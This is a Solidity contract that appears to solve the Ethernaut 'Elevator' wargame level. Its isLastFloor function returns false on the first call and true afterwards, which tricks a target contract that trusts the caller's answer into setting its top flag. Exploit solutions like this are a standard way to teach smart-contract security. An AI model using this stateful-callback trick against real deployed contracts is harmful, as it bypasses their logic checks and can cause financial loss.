//SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.0;

import "hardhat/console.sol";

interface Elevator {
    function top() external view returns (bool);
    function floor() external view returns (uint);
    function goTo(uint floor) external;
}

contract Building {
    Elevator public immutable elevator;
    bool public hasBeenCalled = false;

    constructor(address _elevatorAddr) {
        elevator = Elevator(_elevatorAddr);
    }

    function isLastFloor(uint _floor) external returns (bool) {
        if (!hasBeenCalled) {
            hasBeenCalled = true;
            return false;
        }
        return true;
    }

    function goTo(uint _floor) external {
        elevator.goTo(_floor);
    }

}